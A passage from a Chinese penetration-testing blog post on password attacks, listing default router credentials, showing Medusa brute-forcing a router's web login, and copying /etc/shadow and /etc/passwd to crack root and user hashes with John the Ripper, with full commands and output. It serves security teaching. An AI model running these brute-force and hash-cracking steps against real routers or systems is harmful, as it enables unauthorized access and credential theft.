路由器初始密码</h3><p>大部分路由器都有初始用户名和密码。为了方便用户实施路由器密码破解，下面列出常见的路由器初始用户名和密码，如下表所示。</p><table><thead><tr><th>用户名</th><th>密码</th></tr></thead><tbody><tr><td>admin</td><td>admin</td></tr><tr><td>root</td><td>root</td></tr><tr><td>user</td><td>user</td></tr><tr><td>user</td><td>password</td></tr><tr><td>adsl</td><td>adsl1234</td></tr><tr><td>admin</td><td>password</td></tr><tr><td>admin</td><td>conexant</td></tr><tr><td>password</td><td>password</td></tr><tr><td>admin</td><td>123456</td></tr><tr><td>admin</td><td>utstar</td></tr><tr><td>admin</td><td>private</td></tr><tr><td>admin</td><td>epicrouter</td></tr><tr><td>SZIM</td><td>SZIM</td></tr></tbody></table><h3 id="4-2-使用Medusa工具"><a href="#4-2-使用Medusa工具" class="headerlink" title="4.2 使用Medusa工具"></a>4.2 使用Medusa工具</h3><p>Medusa是一款开源的暴力密码破解工具，可以在线破解多种密码，如FTP、HTTP、IMAP和MYSQL等。其中，路由器的管理界面是基于HTTP协议的，所以用户可以使用Medusa工具实施密码破解。下面将介绍使用Medusa工具暴破路由器密码的方法。<br>使用Medusa工具暴力破解路由器密码的语法格式如下：</p><blockquote><p>medusa -h [IP] -U [user file] -P [pass file] -M http -e ns</p></blockquote><p>以上语法中的选项及含义如下：</p><blockquote><p>-h：指定目标主机的地址。<br>-u：指定尝试破解的用户名。<br>-U：指定使用的用户名文件。<br>-p：指定尝试破解的密码。<br>-P：指定使用的密码文件。<br>-M：指定要破解的模块类型。<br>-e：尝试空密码。</p></blockquote><p>暴力破解TP-Linux路由器的登录用户名和密码。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># medusa -h 192.168.1.1 -u admin -P passords.txt -M http -e ns</span></span><br><span class="line">Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks </span><br><span class="line">&lt;jmk@foofus.net&gt;</span><br><span class="line">ACCOUNT CHECK: [http] Host: 192.168.1.1 (1 of 1, 0 complete) User: admin </span><br><span class="line">(1 of 1, 0 complete) Password:  (1 of 3108 complete)</span><br><span class="line">ACCOUNT CHECK: [http] Host: 192.168.1.1 (1 of 1, 0 complete) User: admin </span><br><span class="line">(1 of 1, 0 complete) Password: admin (2 of 3108 complete)</span><br><span class="line">ACCOUNT FOUND: [http] Host: 192.168.1.1 User: admin Password: abc.123456</span><br><span class="line">[SUCCESS]</span><br></pre></td></tr></table></figure><p>以上输出的信息显示了破解路由器密码的过程。从显示的结果中可以看到，成功破解了路由器的用户名和密码。其中，用户名为admin，密码为abc.123456。</p><h2 id="五、破解Linux用户密码"><a href="#五、破解Linux用户密码" class="headerlink" title="五、破解Linux用户密码"></a>五、破解Linux用户密码</h2><p>在Linux中，很多操作都需要根用户root才可以执行。如果获取一个Linux远程会话的用户没有权限，又无法提权，则该会话也就没有用了。此时，用户可以对Linux系统用户密码实施破解，进而登录目标系统。下面将介绍破解Linux用户密码的方法。</p><p>Linux系统将加密的密码散列保存在名为shadow的文件里，该文件默认保存在/etc/shadow中。只要将该文件破解，就可以查看到用户的原始密码。但是在破解/etc/shadow密码之前，还需要/etc/passwd文件。该文件中保存了用户的基本信息，如用户名称、宿主目录和登录Shell等。破解Linux用户密码就是通过提取/etc/shadow和/etc/passwd文件，将它们结合在一起，然后使用密码破解工具进行破解。</p><p>破解Linux用户密码。具体操作步骤如下：</p><ol><li><p>为了方便输入，这里将获取的用户密码文件复制到/root中。执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cp /etc/passwd /etc/shadow /root/</span></span><br></pre></td></tr></table></figure><p>执行以上命令后，passwd和shadow文件就保存到/root目录中了。</p></li><li><p>使用unshadow命令提取密码文件。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># unshadow passwd shadow &gt; cracked</span></span><br></pre></td></tr></table></figure><p>执行以上命令，表示将passwd和shadow文件中的内容都提取出来，并保存到cracked目录中。</p></li><li><p>使用john工具破解密码。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># john --wordlist=/usr/share/john/password.lst cracked</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (sha512crypt, crypt(3) <span class="variable">$6</span>$ [SHA512 128/128 AVX 2x])</span><br><span class="line">Cost 1 (iteration count) is 5000 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">abc.123456       (root)</span><br><span class="line">123456           (admin)</span><br><span class="line">1g 0:00:00:01 DONE (2020-12-31 13:21) 0.5747g/s 2039p/s 2039c/s 2039C/s jussi..Abc.123456</span><br><span class="line">Use the <span class="string">"--show"</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>以上命令中的–wordlist选项，是用来指定破解密码的密码字典。</p><p>从输出的信息中可以看到，当前系统root用户的密码是abc.123456。此时，用户也可以使用–show选项查看passwd第2个字段的信息。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># john --show cracked</span></span><br><span class="line">root:abc.123456:0:0:root:/root:/bin/bash</span><br><span class="line">admin:123456:1000:1001:admin,,,:/home/admin:/bin/bash</span><br><span class="line">2 password <span class="built_in">hash</span> cracked, 2 left</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，passwd中root用户第2个字段由原来的密码占位符变成了真实的密码。</p><p>使用John the Ripper工具破解Linux用户密码时，必须在本机上操作。而且，对/etc/shadow和/etc/passwd这两个文件必须要有读取的权限。</p></li></ol></div><div><div><div style="text-align:center;color:#ccc;font-size:14px">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div></div></div><div></div><footer class="post-footer"><div class="post-tags"><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"><i class="fa fa-tag"></i> 渗透测试</a> <a href="/tags/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/" rel="tag"><i class="fa fa-tag"></i> 密码攻击</a></div><div class="post-nav"><div class="post-nav-next post-nav-item"><a href="/2021/01/04/kali-xiu-tan-qi-pian/" rel="next" title="嗅探欺骗"><i class="fa fa-chevron-left"></i> 嗅探欺骗</a></div><span class="post-nav-divider"></span><div class="post-nav-prev post-nav-item"><a href="/2021/01/05/kali-an-zhuang-findmyhash/" rel="prev" title="Kali 安装findmyhash">Kali 安装findmyhash <i class="fa fa-chevron-right"></i></a></div></div></footer></div></article><div class="post-spread"><div class="jiathis_style"><span class="jiathis_txt">分享到：</span> <a class="jiathis_button_fav">收藏夹</a> <a class="jiathis_button_copy">复制网址</a> <a class="jiathis_button_email">邮件</a> <a class="jiathis_button_weixin">微信</a> <a class="jiathis_button_qzone">QQ空间</a> <a class="jiathis_button_tqq">腾讯微博</a> <a class="jiathis_button_douban">豆瓣</a> <a class="jiathis_button_share">一键分享</a> <a href="http://www.jiathis.com/share?uid=2140465" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank">更多</a> <a class="jiathis_counter_style"></a></div><script type="text/javascript">var jiathis_config={data_track_clickback:!0,summary:"",shortUrl:!1,hideMore:!1}</script><script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=" charset="utf-8"></script></div></div></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span> <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span> <span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div id="sidebar-dimmer"></div><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">文章目录</li><li class="sidebar-nav-overview" data-target="site-overview-wrap">站点概览</li></ul><section class="site-overview-wrap sidebar-panel"><div class="site-overview"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" src="/images/chen.png" alt="Zhongzhou Chen"><p class="site-author-name" itemprop="name">Zhongzhou Chen</p><p class="site-description motion-element" itemprop="description"></p></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"><a href="/archives/%7C%7C%20archive"><span class="site-state-item-count">312</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/index.html"><span class="site-state-item-count">84</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/index.html"><span class="site-state-item-count">180</span> <span class="site-state-item-name">标签</span></a></div></nav><div class="feed-link motion-element"><a href="/atom.xml" rel="alternate"><i class="fa fa-rss"></i> RSS</a></div></div></section><section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"><div class="post-toc"><div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#密码攻击"><span class="nav-text">密码攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、创建字典"><span class="nav-text">一、创建字典</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-密码信息收集"><span class="nav-text">1.1 密码信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-密码策略分析"><span class="nav-text">1.2 密码策略分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-1-软件-系统固有策略"><span class="nav-text">1.2.1 软件/系统固有策略</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-2-加固策略"><span class="nav-text">1.2.2 加固策略</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-3-分析已有密码字典策略"><span class="nav-text">1.2.3 分析已有密码字典策略</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-生成字典"><span class="nav-text">1.3 生成字典</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-3-1-使用Crunch工具"><span class="nav-text">1.3.1 使用Crunch工具</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-3-2-使用rsmangler工具"><span class="nav-text">1.3.2 使用rsmangler工具</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-3-3-使用rtgen工具"><span class="nav-text">1.3.3 使用rtgen工具</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、破解哈希密码"><span class="nav-text">二、破解哈希密码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-识别哈希加密方式"><span class="nav-text">2.1 识别哈希加密方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-1-hashid工具"><span class="nav-text">2.1.1 hashid工具</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-1-hash-identifier工具"><span class="nav-text">2.1.1 hash-identifier工具</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-破解LM-Hashes密码"><span class="nav-text">2.2 破解LM Hashes密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-直接使用哈希密码值"><span class="nav-text">2.3 直接使用哈希密码值</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、借助Utilman绕过Windows登录"><span class="nav-text">三、借助Utilman绕过Windows登录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、路由器密码破解"><span class="nav-text">四、路由器密码破解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-路由器初始密码"><span class="nav-text">4.1 路由器初始密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-使用Medusa工具"><span class="nav-text">4.2 使用Medusa工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五、破解Linux用户密码"><span class="nav-text">五、破解Linux用户密码</span></a></li></ol></li></ol></div></div></section><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span id="scrollpercent"><span>0</span>%</span></div></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="copyright">&copy; <span itemprop="copyrightYear">2021</span> <span class="with-love"><i class="fa fa-user"></i> </span><span class="author" itemprop="copyrightHolder">Zhongzhou Chen</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-area-chart"></i> </span><span class="post-meta-item-text">Site words total count&#58;</span> <span title="Site words total count">738.6k</span></div><span class="post-meta-divider"></span></div></footer></div><script type="text/javascript">"[object Function]"!==Object.prototype.toString.call(window.Promise)&&(window.Promise=null)</script><script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script><script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script><script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script><script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script><script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(t){var e=$(this).parent().find(".code").find(".line").map(function(t,e){return $(e).text()}).toArray().join("\n"),n=document.createElement("textarea");document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus();var o=document.execCommand("copy");document.body.removeChild(n),o?$(this).text("复制成功"):$(this).text("复制失败"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("复制")},300)}).append(e)})</script><script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script><script type="text/javascript">function proceedsearch(){$("body").append('<div class="search-popup-overlay local-search-pop-overlay"></div>').css("overflow","hidden"),$(".search-popup-overlay").click(onPopupClose),$(".popup").toggle();var t=$("#local-search-input");t.attr("autocapitalize","none"),t.attr("autocorrect","off"),t.focus()}var isfetched=!1,isXml=!0,search_path="search.xml";0===search_path.length?search_path="search.xml":/json$/i.test(search_path)&&(isXml=!1);var path="/"+search_path,onPopupClose=function(t){$(".popup").hide(),$("#local-search-input").val(""),$(".search-result-list").remove(),$("#no-result").remove(),$(".local-search-pop-overlay").remove(),$("body").css("overflow","")},searchFunc=function(t,e,o){"use strict";$("body").append('<div class="search-popup-overlay local-search-pop-overlay"><div id="search-loading-icon"><i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i></div></div>').css("overflow","hidden"),$("#search-loading-icon").css("margin","20% auto 0 auto").css("text-align","center"),$.ajax({url:t,dataType:isXml?"xml":"json",async:!0,success:function(t){isfetched=!0,$(".popup").detach().appendTo(".header-inner");var n=isXml?$("entry",t).map(function(){return{title:$("title",this).text(),content:$("content",this).text(),url:$("url",this).text()}}).get():t,r=document.getElementById(e),s=document.getElementById(o),a=function(){var t=r.value.trim().toLowerCase(),e=t.split(/[\s\-]+/);e.length>1&&e.push(t);var o=[];if(t.length>0&&n.forEach(function(n){function r(e,o,n,r){for(var s=r[r.length-1],a=s.position,i=s.word,l=[],h=0;a+i.length<=n&&0!=r.length;){i===t&&h++,l.push({position:a,length:i.length});var p=a+i.length;for(r.pop();0!=r.length&&(s=r[r.length-1],a=s.position,i=s.word,p>a);)r.pop()}return c+=h,{hits:l,start:o,end:n,searchTextCount:h}}function s(t,e){var o="",n=e.start;return e.hits.forEach(function(e){o+=t.substring(n,e.position);var r=e.position+e.length;o+='<b class="search-keyword">'+t.substring(e.position,r)+"</b>",n=r}),o+=t.substring(n,e.end)}var a=!1,i=0,c=0,l=n.title.trim(),h=l.toLowerCase(),p=n.content.trim().replace(/<[^>]+>/g,""),u=p.toLowerCase(),f=decodeURIComponent(n.url),d=[],g=[];if(""!=l&&(e.forEach(function(t){function e(t,e,o){var n=t.length;if(0===n)return[];var r=0,s=[],a=[];for(o||(e=e.toLowerCase(),t=t.toLowerCase());(s=e.indexOf(t,r))>-1;)a.push({position:s,word:t}),r=s+n;return a}d=d.concat(e(t,h,!1)),g=g.concat(e(t,u,!1))}),(d.length>0||g.length>0)&&(a=!0,i=d.length+g.length)),a){[d,g].forEach(function(t){t.sort(function(t,e){return e.position!==t.position?e.position-t.position:t.word.length-e.word.length})});var v=[];0!=d.length&&v.push(r(l,0,l.length,d));for(var $=[];0!=g.length;){var C=g[g.length-1],m=C.position,x=C.word,w=m-20,y=m+80;0>w&&(w=0),y<m+x.length&&(y=m+x.length),y>p.length&&(y=p.length),$.push(r(p,w,y,g))}$.sort(function(t,e){return t.searchTextCount!==e.searchTextCount?e.searchTextCount-t.searchTextCount:t.hits.length!==e.hits.length?e.hits.length-t.hits.length:t.start-e.start});var T=parseInt("1");T>=0&&($=$.slice(0,T));var b="";b+=0!=v.length?"<li><a href='"+f+"' class='search-result-title'>"+s(l,v[0])+"</a>":"<li><a href='"+f+"' class='search-result-title'>"+l+"</a>",$.forEach(function(t){b+="<a href='"+f+'\'><p class="search-result">'+s(p,t)+"...</p></a>"}),b+="</li>",o.push({item:b,searchTextCount:c,hitCount:i,id:o.length})}}),1===e.length&&""===e[0])s.innerHTML='<div id="no-result"><i class="fa fa-search fa-5x" /></div>';else if(0===o.length)s.innerHTML='<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>';else{o.sort(function(t,e){return t.searchTextCount!==e.searchTextCount?e.searchTextCount-t.searchTextCount:t.hitCount!==e.hitCount?e.hitCount-t.hitCount:e.id-t.id});var a='<ul class="search-result-list">';o.forEach(function(t){a+=t.item}),a+="</ul>",s.innerHTML=a}};r.addEventListener("input",a),$(".local-search-pop-overlay").remove(),$("body").css("overflow",""),proceedsearch()}})};$(".popup-trigger").click(function(t){t.stopPropagation(),isfetched===!1?searchFunc(path,"local-search-input","local-search-result"):proceedsearch()}),$(".popup-btn-close").click(onPopupClose),$(".popup").click(function(t){t.stopPropagation()}),$(document).on("keyup",function(t){var e=27===t.which&&$(".search-popup").is(":visible");e&&onPopupClose()})</script><script type="text/javascript" src="/js/src/love.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,log:!1,model:{jsonPath:"/live2dw/assets/shizuku.model.json"},display:{position:"right"},mobile:{show:!0,scale:.5},react:{opacityDefault:.7,opacityOnHover:.2}})</script></body></html><!-- rebuild by neat -->